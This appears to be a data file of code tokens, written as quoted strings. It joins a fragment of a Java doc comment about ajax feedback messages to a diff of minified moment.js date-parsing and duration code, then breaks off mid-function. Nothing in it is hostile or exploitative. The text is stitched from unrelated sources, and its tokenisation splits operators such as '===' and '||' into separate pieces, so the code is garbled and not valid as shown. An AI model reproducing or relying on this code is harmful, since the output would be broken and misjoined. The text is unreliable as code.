"feedback", "ajax", "messages", ".", "<", "br", ">", "*", "The", "hosting", "page", "should", "implement", "a", "code", "like", ":", "*", "*", "<", "pre", ">", "*", "<", "code", ">", "*", "public", "void", "onEvent", "(", "IEvent", "&", "lt", ";", "?&", "gt", ";", "event", ")", "@", "@", "-", "1", ",", "7", "+", "1", ",", "6", "@", "@", "/", "/!", "moment", ".", "js", "/", "/!", "version", ":", "2", ".", "8", ".", "4", "/", "/!", "version", ":", "2", ".", "19", ".", "3", "/", "/!", "authors", ":", "Tim", "Wood", ",", "Iskren", "Chernev", ",", "Moment", ".", "js", "contributors", "/", "/!", "license", ":", "MIT", "/", "/!", "momentjs", ".", "com", "(", "function", "(", "a", ")", "{", "function", "b", "(", "a", ",", "b", ",", "c", ")", "{", "switch", "(", "arguments", ".", "length", ")", "{", "case", "2", ":", "return", "null", "!", "=", "a", "?", "a", ":", "b", ";", "case", "3", ":", "return", "null", "!", "=", "a", "?", "a", ":", "null", "!", "=", "b", "?", "b", ":", "c", ";", "default", ":", "throw", "new", "Error", "(", "\"", "Implement", "me", "\"", ")}", "}", "function", "c", "(", "a", ",", "b", ")", "{", "return", "zb", ".", "call", "(", "a", ",", "b", ")", "}", "function", "d", "(", "){", "return", "{", "empty", ":", "!", "1", ",", "unusedTokens", ":", "[]", ",", "unusedInput", ":", "[]", ",", "overflow", ":", "-", "2", ",", "charsLeftOver", ":", "0", ",", "nullInput", ":", "!", "1", ",", "invalidMonth", ":", "null", ",", "invalidFormat", ":", "!", "1", ",", "userInvalidated", ":", "!", "1", ",", "iso", ":", "!", "1", "}", "}", "function", "e", "(", "a", ")", "{", "tb", ".", "suppressDeprecationWarnings", "=", "==", "!", "1", "&", "&\"", "undefined", "\"", "!=", "typeof", "console", "&", "&", "console", ".", "warn", "&", "&", "console", ".", "warn", "(", "\"", "Deprecation", "warning", ":", "\"", "+", "a", ")", "}", "function", "f", "(", "a", ",", "b", ")", "{", "var", "c", "=", "!", "0", ";", "return", "m", "(", "function", "(", "){", "return", "c", "&", "&(", "e", "(", "a", ")", ",", "c", "=", "!", "1", ")", ",", "b", ".", "apply", "(", "this", ",", "arguments", ")", "},", "b", ")", "}", "function", "g", "(", "a", ",", "b", ")", "{", "qc", "[", "a", "]", "||", "(", "e", "(", "b", ")", ",", "qc", "[", "a", "]", "=!", "0", ")", "}", "function", "h", "(", "a", ",", "b", ")", "{", "return", "function", "(", "c", ")", "{", "return", "p", "(", "a", ".", "call", "(", "this", ",", "c", ")", ",", "b", ")", "}}", "function", "i", "(", "a", ",", "b", ")", "{", "return", "function", "(", "c", ")", "{", "return", "this", ".", "localeData", "(", ").", "ordinal", "(", "a", ".", "call", "(", "this", ",", "c", ")", ",", "b", ")", "}}", "function", "j", "(", "){", "}", "function", "k", "(", "a", ",", "b", ")", "{", "b", "!", "==", "!", "1", "&", "&", "F", "(", "a", ")", ",", "n", "(", "this", ",", "a", ")", ",", "this", ".", "_d", "=", "new", "Date", "(", "+", "a", ".", "_d", ")", "}", "function", "l", "(", "a", ")", "{", "var", "b", "=", "y", "(", "a", ")", ",", "c", "=", "b", ".", "year", "|", "|", "0", ",", "d", "=", "b", ".", "quarter", "|", "|", "0", ",", "e", "=", "b", ".", "month", "|", "|", "0", ",", "f", "=", "b", ".", "week", "|", "|", "0", ",", "g", "=", "b", ".", "day", "|", "|", "0", ",", "h", "=", "b", ".", "hour", "|", "|", "0", ",", "i", "=", "b", ".", "minute", "|", "|", "0", ",", "j", "=", "b", ".", "second", "|", "|", "0", ",", "k", "=", "b", ".", "millisecond", "|", "|", "0", ";", "this", ".", "_milliseconds", "=", "+", "k", "+", "1e3", "*", "j", "+", "6e4", "*", "i", "+", "36e5", "*", "h", ",", "this", ".", "_days", "=", "+", "g", "+", "7", "*", "f", ",", "this", ".", "_months", "=", "+", "e", "+", "3", "*", "d", "+", "12", "*", "c", ",", "this", ".", "_data", "=", "{}", ",", "this", ".", "_locale", "=", "tb", ".", "localeData", "(", "),", "this", ".", "_bubble", "(", ")}", "function", "m", "(", "a", ",", "b", ")", "{", "for", "(", "var", "d", "in", "b", ")", "c", "(", "b", ",", "d", ")", "&&", "(", "a", "[", "d", "]", "=", "b", "[", "d", "]", ");", "return", "c", "(", "b", ",", "\"", "toString", "\"", ")&", "&(", "a", ".", "toString", "=", "b", ".", "toString", ")", ",", "c", "(", "b", ",", "\"", "valueOf", "\"", ")&", "&(", "a", ".", "valueOf", "=", "b", ".", "valueOf", ")", ",", "a", "}", "function", "n", "(", "a", ",", "b", ")", "{", "var", "c", ",", "d", ",", "e", ";", "if", "(", "\"", "undefined", "\"", "!=", "typeof", "b", ".", "_isAMomentObject", "&", "&(", "a", ".", "_isAMomentObject", "=", "b", ".", "_isAMomentObject", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_i", "&", "&(", "a", ".", "_i", "=", "b", ".", "_i", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_f", "&", "&(", "a", ".", "_f", "=", "b", ".", "_f", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_l", "&", "&(", "a", ".", "_l", "=", "b", ".", "_l", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_strict", "&", "&(", "a", ".", "_strict", "=", "b", ".", "_strict", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_tzm", "&", "&(", "a", ".", "_tzm", "=", "b", ".", "_tzm", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_isUTC", "&", "&(", "a", ".", "_isUTC", "=", "b", ".", "_isUTC", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_offset", "&", "&(", "a", ".", "_offset", "=", "b", ".", "_offset", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_pf", "&", "&(", "a", ".", "_pf", "=", "b", ".", "_pf", ")", ",\"", "undefined", "\"", "!=", "typeof", "b", ".", "_locale", "&", "&(", "a", ".", "_locale", "=", "b", ".", "_locale", ")", ",", "Ib", ".", "length", ">", "0", ")", "for", "(", "c", "in", "Ib", ")", "d", "=", "Ib", "[", "c", "]", ",", "e", "=", "b", "[", "d", "]", ",\"", "undefined", "\"", "!=", "typeof", "e", "&", "&(", "a", "[", "d", "]", "=", "e", ")", ";", "return", "a", "}", "function", "o", "(", "a", ")", "{", "return", "0", ">", "a", "?", "Math", ".", "ceil", "(", "a", ")", ":", "Math", ".", "floor", "(", "a", ")", "}", "function", "p", "(", "a", ",", "b", ",", "c", ")", "{", "for", "(", "var", "d", "=", "\"\"", "+", "Math", ".", "abs", "(", "a", ")", ",", "e", "=", "a", ">", "=", "0", ";", "d", ".", "length", "<", "b", ";", ")", "d", "=", "\"", "0", "\"", "+", "d", ";", "return", "(", "e", "?", "c", "?", "\"+", "\":", "\"\"", ":\"", "-\"", ")+", "d", "}", "function", "q", "(", "a", ",", "b", ")", "{", "var", "c", "=", "{", "milliseconds", ":", "0", ",", "months", ":", "0", "}", ";", "return", "c", ".", "months", "=", "b", ".", "month", "(", ")-", "a", ".", "month", "(", ")+", "12", "*", "(", "b", ".", "year", "(", ")-", "a", ".", "year", "(", "))", ",", "a", ".", "clone", "(", ").", "add", "(", "c", ".", "months", ",", "\"", "M", "\"", ").", "isAfter", "(", "b", ")", "&&", "--", "c", ".", "months", ",", "c", ".", "milliseconds", "=", "+", "b", "-", "+", "a", ".", "clone", "(", ").", "add", "(", "c", ".", "months", ",", "\"", "M", "\"", "),", "c", "}", "function", "r", "(", "a", ",", "b", ")", "{", "var", "c", ";", "return", "b", "=", "K", "(", "b", ",", "a", ")", ",", "a", ".", "isBefore", "(", "b", ")", "?", "c", "=", "q", "(", "a", ",", "b", ")", ":(", "c", "=", "q", "(", "b", ",", "a", ")", ",", "c", ".", "milliseconds", "=", "-", "c", ".", "milliseconds", ",", "c", ".", "months", "=", "-", "c", ".", "months", ")", ",", "c", "}", "function", "s", "(", "a", ",", "b", ")", "{", "return", "function", "(", "c", ",", "d", ")", "{", "var", "e", ",", "f", ";", "return", "null", "=", "==", "d", "|", "|", "isNaN", "(", "+", "d", ")", "||", "(", "g", "(", "b", ",", "\"", "moment", "(", ").", "\"+", "b", "+", "\"(", "period", ",", "number", ")", "is", "deprecated", ".", "Please", "use", "moment", "(", ").", "\"+", "b", "+", "\"(", "number", ",", "period", ")", ".\"", "),", "f", "=", "c", ",", "c", "=", "d", ",", "d", "=", "f", ")", ",", "c", "=", "\"", "string", "\"", "==", "typeof", "c", "?", "+", "c", ":", "c", ",", "e", "=", "tb", ".", "duration", "(", "c", ",", "d", ")", ",", "t", "(", "this", ",", "e", ",", "a", ")", ",", "this", "}", "}", "function", "t", "(", "a", ",", "b", ",", "c", ",", "d", ")", "{", "var", "e", "=", "b", ".", "_milliseconds", ",", "f", "=", "b", ".", "_days", ",", "g", "=", "b", ".", "_months", ";", "d", "=", "null", "=", "=", "d", "?", "!", "0", ":", "d", ",", "e", "&", "&", "a", ".", "_d", ".", "setTime", "(", "+", "a", ".", "_d", "+", "e", "*", "c", ")", ",", "f", "&", "&", "nb", "(", "a", ",", "\"", "Date", "\"", ",", "mb", "(", "a", ",", "\"", "Date", "\"", ")+", "f", "*", "c", ")", ",", "g", "&", "&", "lb", "(", "a", ",", "mb", "(", "a", ",", "\"", "Month", "\"", ")+", "g", "*", "c", ")", ",", "d", "&", "&", "tb", ".", "updateOffset", "(", "a", ",", "f", "|", "|", "g", ")", "}", "function", "u", "(", "a", ")", "{", "return", "\"", "[", "object", "Array", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "a", ")", "}", "function", "v", "(", "a", ")", "{", "return", "\"", "[", "object", "Date", "]", "\"=", "==", "Object", ".", "prototype", ".", "toString", ".", "call", "(", "a", ")", "||", "a", "instanceof", "Date", "}", "function", "w", "(", "a", ",", "b", ",", "c", ")", "{", "var", "d", ",", "e", "=", "Math", ".", "min", "(", "a", ".", "length", ",", "b", ".", "length", ")", ",", "f", "=", "Math", ".", "abs", "(", "a", ".", "length", "-", "b", ".", "length", ")", ",", "g", "=", "0", ";", "for", "(", "d", "=", "0", ";", "e", ">", "d", ";", "d", "+", "+)", "(", "c", "&", "&", "a", "[", "d", "]", "!=", "=", "b", "[", "d", "]", "||", "!", "c", "&", "&", "A", "(", "a", "[", "d", "]", ")!", "==", "A", "(", "b", "[", "d", "]", "))", "&&", "g", "+", "+;", "return", "g", "+", "f", "}", "function", "x", "(", "a", ")", "{", "if", "(", "a", ")", "{", "var", "b", "=", "a", ".", "toLowerCase", "(", ").", "replace", "(", "/(", ".)", "s", "$", "/,", "\"$", "1", "\"", ");", "a", "=", "jc", "[", "a", "]", "||", "kc", "[", "b", "]", "||", "b", "}", "return", "a", "}", "function", "y", "(", "a", ")", "{", "var", "b", ",", "d", ",", "e", "=", "{}", ";", "for", "(", "d", "in", "a", ")", "c", "(", "a", ",", "d", ")", "&&", "(", "b", "=", "x", "(", "d", ")", ",", "b", "&", "&(", "e", "[", "b", "]", "=", "a", "[", "d", "]", "))", ";", "return", "e", "}", "function", "z", "(", "b", ")", "{", "var", "c", ",", "d", ";", "if", "(", "0", "=", "==", "b", ".", "indexOf", "(", "\"", "week", "\"", "))", "c", "=", "7", ",", "d", "=", "\"", "day", "\"", ";", "else", "{", "if", "(", "0", "!", "==", "b", ".", "indexOf", "(", "\"", "month", "\"", "))", "return", ";", "c", "=", "12", ",", "d", "=", "\"", "month", "\"", "}", "tb", "[", "b", "]", "=", "function", "(", "e", ",", "f", ")", "{", "var", "g", ",", "h", ",", "i", "=", "tb", ".", "_locale", "[", "b", "]", ",", "j", "=", "[]", ";", "if", "(", "\"", "number", "\"", "==", "typeof", "e", "&", "&(", "f", "=", "e", ",", "e", "=", "a", ")", ",", "h", "=", "function", "(", "a", ")", "{", "var", "b", "=", "tb", "(", ").", "utc", "(", ").", "set", "(", "d", ",", "a", ")", ";", "return", "i", ".", "call", "(", "tb", ".", "_locale", ",", "b", ",", "e", "|", "|\"", "\")", "},", "null", "!", "=", "f", ")", "return", "h", "(", "f", ")", ";", "for", "(", "g", "=", "0", ";", "c", ">", "g", ";", "g", "+", "+)", "j", ".", "push", "(", "h", "(", "g", ")", ");", "return", "j", "}", "}", "function", "A", "(", "a", ")", "{", "var", "b", "=", "+", "a", ",", "c", "=", "0", ";", "return", "0", "!", "==", "b", "&", "&", "isFinite", "(", "b", ")", "&&", "(", "c", "=", "b", ">", "=", "0", "?", "Math", ".", "floor", "(", "b", ")", ":", "Math", ".", "ceil", "(", "b", ")", "),", "c", "}", "function", "B", "(", "a", ",", "b", ")", "{", "return", "new", "Date", "(", "Date", ".", "UTC", "(", "a", ",", "b", "+", "1", ",", "0", ")", ").", "getUTCDate", "(", ")}", "function", "C", "(", "a", ",", "b", ",", "c", ")", "{", "return", "hb", "(", "tb", "(", "[", "a", ",", "11", ",", "31", "+", "b", "-", "c", "]", "),", "b", ",", "c", ")", ".", "week", "}", "function", "D", "(", "a", ")", "{", "return", "E", "(", "a", ")", "?", "366", ":", "365", "}", "function", "E", "(", "a", ")", "{", "return", "a", "%", "4", "=", "==", "0", "&", "&", "a", "%", "100", "!", "==", "0", "|", "|", "a", "%", "400", "=", "==", "0", "}", "function", "F", "(", "a", ")", "{", "var", "b", ";", "a", ".", "_a", "&", "&-", "2", "=", "==", "a", ".", "_pf", ".", "overflow", "&", "&(", "b", "=", "a", ".", "_a", "[", "Bb", "]", "<", "0", "|", "|", "a", ".", "_a", "[", "Bb", "]", ">", "11", "?", "Bb", ":", "a", ".", "_a", "[", "Cb", "]", "<", "1", "|", "|", "a", ".", "_a", "[", "Cb", "]", ">", "B", "(", "a", ".", "_a", "[", "Ab", "]", ",", "a", ".", "_a", "[", "Bb", "]", ")?", "Cb", ":", "a", ".", "_a", "[", "Db", "]", "<", "0", "|", "|", "a", ".", "_a", "[", "Db", "]", ">", "24", "|", "|", "24", "=", "==", "a", ".", "_a", "[", "Db", "]", "&&", "(", "0", "!", "==", "a", ".", "_a", "[", "Eb", "]", "||", "0", "!", "==", "a", ".", "_a", "[", "Fb", "]", "||", "0", "!", "==", "a", ".", "_a", "[", "Gb", "]", ")?", "Db", ":", "a", ".", "_a", "[", "Eb", "]", "<", "0", "|", "|", "a", ".", "_a", "[", "Eb", "]", ">", "59", "?", "Eb", ":", "a", ".", "_a", "[", "Fb", "]", "<", "0", "|", "|", "a", ".", "_a", "[", "Fb", "]", ">", "59", "?", "Fb", ":", "a", ".", "_a", "[", "Gb", "]", "<", "0", "|", "|", "a", ".", "_a", "[", "Gb", "]", ">", "999", "?", "Gb", ":", "-", "1", ",", "a", ".", "_pf", ".", "_overflowDayOfYear", "&", "&(", "Ab", ">", "b", "|", "|", "b", ">", "Cb", ")", "&&", "(", "b", "=", "Cb", ")", ",", "a", ".", "_pf", ".", "overflow", "=", "b", ")", "}", "function", "G", "(", "b", ")", "{", "return", "null", "=", "=", "b", ".", "_isValid", "&", "&(", "b", ".", "_isValid", "=", "!", "isNaN", "(", "b", ".", "_d", ".", "getTime", "(", "))", "&&", "b", ".", "_pf", ".", "overflow", "<", "0", "&", "&!", "b", ".", "_pf", ".", "empty", "&", "&!", "b", ".", "_pf", ".", "invalidMonth", "&", "&!", "b", ".", "_pf", ".", "nullInput", "&", "&!", "b", ".", "_pf", ".", "invalidFormat", "&", "&!", "b", ".", "_pf", ".", "userInvalidated", ",", "b", ".", "_strict", "&", "&(", "b", ".", "_isValid", "=", "b", ".", "_isValid", "&", "&", "0", "=", "==", "b", ".", "_pf", ".", "charsLeftOver", "&", "&", "0", "=", "==", "b", ".", "_pf", ".", "unusedTokens", ".", "length", "&", "&", "b", ".", "_pf", ".", "bigHour", "=", "==", "a", ")", "),", "b", ".", "_isValid", "}", "function", "H", "(", "a", ")", "{", "return", "a", "?", "a", ".", "toLowerCase", "(", ").", "replace", "(", "\"", "_", "\"", ",\"", "-\"", "):", "a", "}", "function", "I", "(", "a", ")", "{", "for", "(", "var", "b", ",", "c", ",", "d", ",", "e", ",", "f", "=", "0", ";", "f", "<", "a", ".", "length", ";", "){", "for", "(", "e", "=", "H", "(", "a", "[", "f", "]", ").", "split", "(", "\"-", "\")", ",", "b", "=", "e", ".", "length", ",", "c", "=", "H", "(", "a", "[", "f", "+", "1", "]", "),", "c", "=", "c", "?", "c", ".", "split", "(", "\"-", "\")", ":", "null", ";", "b", ">", "0", ";", "){", "if", "(", "d", "=", "J", "(", "e", ".", "slice", "(", "0", ",", "b", ")", ".", "join", "(", "\"-", "\")", "))", "return", "d", ";", "if", "(", "c", "&", "&", "c", ".", "length", ">", "=", "b", "&", "&", "w", "(", "e", ",", "c", ",", "!", "0", ")", ">=", "b", "-", "1", ")", "break", ";", "b", "-", "-}", "f", "+", "+}", "return", "null", "}", "function", "J", "(", "a", ")", "{", "var", "b", "=", "null", ";", "if", "(", "!", "Hb", "[", "a", "]", "&&", "Jb", ")", "try", "{", "b", "=", "tb", ".", "locale", "(", "),", "require", "(", "\".", "/", "locale", "/", "\"+", "a", ")", ",", "tb", ".", "locale", "(", "b", ")", "}", "catch", "(", "c", ")", "{}", "return", "Hb", "[", "a", "]", "}", "function", "K", "(", "a", ",", "b", ")", "{", "var", "c", ",", "d", ";", "return", "b", ".", "_isUTC", "?", "(", "c", "=", "b", ".", "clone", "(", "),", "d", "=", "(", "tb", ".", "isMoment", "(", "a", ")", "||", "v", "(", "a", ")", "?+", "a", ":", "+", "tb", "(", "a", ")", ")-", "+", "c", ",", "c", ".", "_d", ".", "setTime", "(", "+", "c", ".", "_d", "+", "d", ")", ",", "tb", ".", "updateOffset", "(", "c", ",", "!", "1", ")", ",", "c", ")", ":", "tb", "(", "a", ")", ".", "local", "(", ")}", "function", "L", "(", "a", ")", "{", "return", "a", ".", "match", "(", "/\\", "[[", "\\", "s", "\\", "S", "]", "/)", "?", "a", ".", "replace", "(", "/^", "\\[", "|\\", "]$", "/", "g", ",", "\"\"", "):", "a", ".", "replace", "(", "/\\", "\\/", "g", ",", "\"\"", ")}", "function", "M", "(", "a", ")", "{", "var", "b", ",", "c", ",", "d", "=", "a", ".", "match", "(", "Nb", ")", ";", "for", "(", "b", "=", "0", ",", "c", "=", "d", ".", "length", ";", "c", ">", "b", ";", "b", "+", "+)", "d", "[", "b", "]", "=", "pc", "[", "d", "[", "b", "]", "]?", "pc", "[", "d", "[", "b", "]", "]:", "L", "(", "d", "[", "b", "]", ");", "return", "function", "(", "e", ")", "{", "var", "f", "=", "\"\"", ";", "for", "(", "b", "=", "0", ";", "c", ">", "b", ";", "b", "+", "+)", "f", "+", "=", "d", "[", "b", "]", "instanceof", "Function", "?", "d", "[", "b", "]", ".", "call", "(", "e", ",", "a", ")", ":", "d", "[", "b", "]", ";", "return", "f", "}", "}", "function", "N", "(", "a", ",", "b", ")", "{", "return", "a", ".", "isValid", "(", ")?", "(", "b", "=", "O", "(", "b", ",", "a", ".", "localeData", "(", "))", ",", "lc", "[", "b", "]", "||", "(", "lc", "[", "b", "]", "=", "M", "(", "b", ")", "),", "lc", "[", "b", "]", "(", "a", ")", "):", "a", ".", "localeData", "(", ").", "invalidDate", "(", ")}", "function", "O", "(", "a", ",", "b", ")", "{", "function", "c", "(", "a", ")", "{", "return", "b", ".", "longDateFormat", "(", "a", ")", "||", "a", "}", "var", "d", "=", "5", ";", "for", "(", "Ob", ".", "lastIndex", "=", "0", ";", "d", ">", "=", "0", "&", "&", "Ob", ".", "test", "(", "a", ")", ";)", "a", "=", "a", ".", "replace", "(", "Ob", ",", "c", ")", ",", "Ob", ".", "lastIndex", "=", "0", ",", "d", "-", "=", "1", ";", "return", "a", "}", "function", "P", "(", "a", ",", "b", ")", "{", "var", "c", ",", "d", "=", "b", ".", "_strict", ";", "switch", "(", "a", ")", "{", "case", "\"", "Q", "\"", ":", "return", "Zb", ";", "case", "\"", "DDDD", "\"", ":", "return", "_b", ";", "case", "\"", "YYYY", "\"", ":", "case", "\"", "GGGG", "\"", ":", "case", "\"", "gggg", "\"", ":", "return", "d", "?", "ac", ":", "Rb", ";", "case", "\"", "Y", "\"", ":", "case", "\"", "G", "\"", ":", "case", "\"", "g", "\"", ":", "return", "cc", ";", "case", "\"", "YYYYYY", "\"", ":", "case", "\"", "YYYYY", "\"", ":", "case", "\"", "GGGGG", "\"", ":", "case", "\"", "ggggg", "\"", ":", "return", "d", "?", "bc", ":", "Sb", ";", "case", "\"", "S", "\"", ":", "if", "(", "d", ")", "return", "Zb", ";", "case", "\"", "SS", "\"", ":", "if", "(", "d", ")", "return", "$", "b", ";", "case", "\"", "SSS", "\"", ":", "if", "(", "d", ")", "return", "_b", ";", "case", "\"", "DDD", "\"", ":", "return", "Qb", ";", "case", "\"", "MMM", "\"", ":", "case", "\"", "MMMM", "\"", ":", "case", "\"", "dd", "\"", ":", "case", "\"", "ddd", "\"", ":", "case", "\"", "dddd", "\"", ":", "return", "Ub", ";", "case", "\"", "a", "\"", ":", "case", "\"", "A", "\"", ":", "return", "b", ".", "_locale", ".", "_meridiemParse", ";", "case", "\"", "x", "\"", ":", "return", "Xb", ";", "case", "\"", "X", "\"", ":", "return", "Yb", ";", "case", "\"", "Z", "\"", ":", "case", "\"", "ZZ", "\"", ":", "return", "Vb", ";", "case", "\"", "T", "\"", ":", "return", "Wb", ";", "case", "\"", "SSSS", "\"", ":", "return", "Tb", ";", "case", "\"", "MM", "\"", ":", "case", "\"", "DD", "\"", ":", "case", "\"", "YY", "\"", ":", "case", "\"", "GG", "\"", ":", "case", "\"", "gg", "\"", ":", "case", "\"", "HH", "\"", ":", "case", "\"", "hh", "\"", ":", "case", "\"", "mm", "\"", ":", "case", "\"", "ss", "\"", ":", "case", "\"", "ww", "\"", ":", "case", "\"", "WW", "\"", ":", "return", "d", "?", "$", "b", ":", "Pb", ";", "case", "\"", "M", "\"", ":", "case", "\"", "D", "\"", ":", "case", "\"", "d", "\"", ":", "case", "\"", "H", "\"", ":", "case", "\"", "h", "\"", ":", "case", "\"", "m", "\"", ":", "case", "\"", "s", "\"", ":", "case", "\"", "w", "\"", ":", "case", "\"", "W", "\"", ":", "case", "\"", "e", "\"", ":", "case", "\"", "E", "\"", ":", "return", "Pb", ";", "case", "\"", "Do", "\"", ":", "return", "d", "?", "b", ".", "_locale", ".", "_ordinalParse", ":", "b", ".", "_locale", ".", "_ordinalParseLenient", ";", "default", ":", "return", "c", "=", "new", "RegExp", "(", "Y", "(", "X", "(", "a", ".", "replace", "(", "\"\\", "\\\"", ",\"", "\")", "),", "\"", "i", "\"", "))", "}}", "function", "Q", "(", "a", ")", "{", "a", "=", "a", "|", "|\"", "\";", "var", "b", "=", "a", ".", "match", "(", "Vb", ")", "||", "[]", ",", "c", "=", "b", "[", "b", ".", "length", "-", "1", "]", "||", "[]", ",", "d", "=", "(", "c", "+", "\"\"", ").", "match", "(", "hc", ")", "||", "[\"", "-\"", ",", "0", ",", "0", "]", ",", "e", "=", "+(", "60", "*", "d", "[", "1", "]", ")+", "A", "(", "d", "[", "2", "]", ");", "return", "\"", "+\"", "==", "=", "d", "[", "0", "]", "?-", "e", ":", "e", "}", "function", "R", "(", "a", ",", "b", ",", "c", ")", "{", "var", "d", ",", "e", "=", "c", ".", "_a", ";", "switch", "(", "a", ")", "{", "case", "\"", "Q", "\"", ":", "null", "!", "=", "b", "&", "&(", "e", "[", "Bb", "]", "=", "3", "*", "(", "A", "(", "b", ")", "-", "1", ")", ");", "break", ";", "case", "\"", "M", "\"", ":", "case", "\"", "MM", "\"", ":", "null", "!", "=", "b", "&", "&(", "e", "[", "Bb", "]", "=", "A", "(", "b", ")", "-", "1", ")", ";", "break", ";", "case", "\"", "MMM", "\"", ":", "case", "\"", "MMMM", "\"", ":", "d", "=", "c", ".", "_locale", ".", "monthsParse", "(", "b", ",", "a", ",", "c", ".", "_strict", ")", ",", "null", "!", "=", "d", "?", "e", "[", "Bb", "]", "=", "d", ":", "c", ".", "_pf", ".", "invalidMonth", "=", "b", ";", "break", ";", "case", "\"", "D", "\"", ":", "case", "\"", "DD", "\"", ":", "null", "!", "=", "b", "&", "&(", "e", "[", "Cb", "]", "=", "A", "(", "b", ")", ");", "break", ";", "case", "\"", "Do", "\"", ":", "null", "!", "=", "b", "&", "&(", "e", "[", "Cb", "]", "=", "A", "(", "parseInt", "(", "b", ".", "match", "(", "/\\", "d", "{", "1", ",", "2", "}", "/)", "[", "0", "]", ",", "10", ")", "))", ";", "break", ";", "case", "\"", "DDD", "\"", ":", "case", "\"", "DDDD", "\"", ":", "null", "!", "=", "b", "&", "&(", "c", ".", "_dayOfYear", "=", "A", "(", "b", ")", ");", "break", ";", "case", "\"", "YY", "\"", ":", "e", "[", "Ab", "]", "=", "tb", ".", "parseTwoDigitYear", "(", "b", ")", ";", "break", ";", "case", "\"", "YYYY", "\"", ":", "case", "\"", "YYYYY", "\"", ":", "case", "\"", "YYYYYY", "\"", ":", "e", "[", "Ab", "]", "=", "A", "(", "b", ")", ";", "break", ";", "case", "\"", "a", "\"", ":", "case", "\"", "A", "\"", ":", "c", ".", "_isPm", "=", "c", ".", "_locale", ".", "isPM", "(", "b", ")", ";", "break", ";", "case", "\"", "h", "\"", ":", "case", "\"", "hh", "\"", ":", "c", ".", "_pf", ".", "bigHour", "=", "!", "0", ";", "case", "\"", "H", "\"", ":", "case", "\"", "HH", "\"", ":", "e", "[", "Db", "]", "=", "A", "(", "b", ")", ";", "break", ";", "case", "\"", "m", "\"", ":", "case", "\"", "mm", "\"", ":", "e", "[", "Eb", "]", "=", "A", "(", "b", ")", ";", "break", ";", "case", "\"", "s", "\"", ":", "case", "\"", "ss", "\"", ":", "e", "[", "Fb", "]", "=", "A", "(", "b", ")", ";", "break", ";", "case", "\"", "S", "\"", ":", "case", "\"", "SS", "\"", ":", "case", "\"", "SSS", "\"", ":", "case", "\"", "SSSS", "\"", ":", "e", "[", "Gb", "]", "=", "A", "(", "1e3", "*", "(\"", "0", ".", "\"+", "b", ")", ");", "break", ";", "case", "\"", "x", "\"", ":", "c", ".", "_d", "=", "new", "Date", "(", "A", "(", "b", ")", ");", "break", ";", "case", "\"", "X", "\"", ":", "c", ".", "_d", "=", "new", "Date", "(", "1e3", "*", "parseFloat", "(", "b", ")", ");", "break", ";", "case", "\"", "Z", "\"", ":", "case", "\"", "ZZ", "\"", ":", "c", ".", "_useUTC", "=", "!", "0", ",", "c", ".", "_tzm", "=", "Q", "(", "b", ")", ";", "break", ";", "case", "\"", "dd", "\"", ":", "case", "\"", "ddd", "\"", ":", "case", "\"", "dddd", "\"", ":", "d", "=", "c", ".", "_locale", ".", "weekdaysParse", "(", "b", ")", ",", "null", "!", "=", "d", "?", "(", "c", ".", "_w", "=", "c", ".", "_w", "|", "|{", "},", "c", ".", "_w", ".", "d", "=", "d", ")", ":", "c", ".", "_pf", ".", "invalidWeekday", "=", "b", ";", "break", ";", "case", "\"", "w", "\"", ":", "case", "\"", "ww", "\"", ":", "case", "\"", "W", "\"", ":", "case", "\"", "WW", "\"", ":", "case", "\"", "d", "\"", ":", "case", "\"", "e", "\"", ":", "case", "\"", "E", "\"", ":", "a", "=", "a", ".", "substr", "(", "0", ",", "1", ")", ";", "case", "\"", "gggg", "\"", ":", "case", "\"", "GGGG", "\"", ":", "case", "\"", "GGGGG", "\"", ":", "a", "=", "a", ".", "substr", "(", "0", ",", "2", ")", ",", "b", "&", "&(", "c", ".", "_w", "=", "c", ".", "_w", "|", "|{", "},", "c", ".", "_w", "[", "a", "]", "=", "A", "(", "b", ")", ");", "break", ";", "case", "\"", "gg", "\"", ":", "case", "\"", "GG", "\"", ":", "c", ".", "_w", "=", "c", ".", "_w", "|", "|{", "},", "c", ".", "_w", "[", "a", "]", "=", "tb", ".", "parseTwoDigitYear", "(", "b", ")", "}}", "function", "S", "(", "a", ")", "{", "var", "c", ",", "d", ",", "e", ",", "f", ",", "g", ",", "h", ",", "i", ";", "c", "=", "a", ".", "_w", ",", "null", "!", "=", "c", ".", "GG", "|", "|", "null", "!", "=", "c", ".", "W", "|", "|", "null", "!", "=", "c", ".", "E", "?", "(", "g", "=", "1", ",", "h", "=", "4", ",", "d", "=", "b", "(", "c", ".", "GG", ",", "a", ".", "_a", "[", "Ab", "]", ",", "hb", "(", "tb", "(", "),", "1", ",", "4", ")", ".", "year", ")", ",", "e", "=", "b", "(", "c", ".", "W", ",", "1", ")", ",", "f", "=", "b", "(", "c", ".", "E", ",", "1", ")", "):", "(", "g", "=", "a", ".", "_locale", ".", "_week", ".", "dow", ",", "h", "=", "a", ".", "_locale", ".", "_week", ".", "doy", ",", "d", "=", "b", "(", "c", ".", "gg", ",", "a", ".", "_a", "[", "Ab", "]", ",", "hb", "(", "tb", "(", "),", "g", ",", "h", ")", ".", "year", ")", ",", "e", "=", "b", "(", "c", ".", "w", ",", "1", ")", ",", "null", "!", "=", "c", ".", "d", "?", "(", "f", "=", "c", ".", "d", ",", "g", ">", "f", "&", "&+", "+", "e", ")", ":", "f", "=", "null", "!", "=", "c", ".", "e", "?", "c", ".", "e", "+", "g", ":", "g", ")", ",", "i", "=", "ib", "(", "d", ",", "e", ",", "f", ",", "h", ",", "g", ")", ",", "a", ".", "_a", "[", "Ab", "]", "=", "i", ".", "year", ",", "a", ".", "_dayOfYear", "=", "i", ".", "dayOfYear", "}", "function", "T", "(", "a", ")", "{", "var", "c", ",", "d", ",", "e", ",", "f", ",", "g", "=", "[]", ";", "if", "(", "!", "a", ".", "_d", ")", "{", "for", "(", "e", "=", "V", "(", "a", ")", ",", "a", ".", "_w", "&", "&", "null", "=", "=", "a", ".", "_a", "[", "Cb", "]", "&&", "null", "=", "=", "a", ".", "_a", "[", "Bb", "]", "&&", "S", "(", "a", ")", ",", "a", 